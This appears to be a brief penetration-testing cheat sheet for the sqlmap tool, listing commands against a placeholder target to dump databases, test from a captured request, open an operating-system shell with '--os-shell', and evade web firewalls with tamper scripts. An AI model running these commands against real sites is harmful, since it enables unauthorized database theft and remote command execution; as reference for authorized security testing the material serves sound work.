# sqlmap

https://sqlmap.org/

Automatic SQL injection detection and exploitation.

```bash
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -r request.txt --batch          # from a Burp request file
sqlmap -u "http://target.com/page?id=1" --os-shell --batch
```

Useful options:
- `--batch` — never prompt, accept defaults
- `--level` / `--risk` — more tests (up to 5 / 3)
- `-p id` — parameter to test
- `--cookie="session=..."` — authenticated testing
- `--technique=BEUSTQ` — injection types (default all)
- `--tamper=space2comment` — WAF bypass tricks
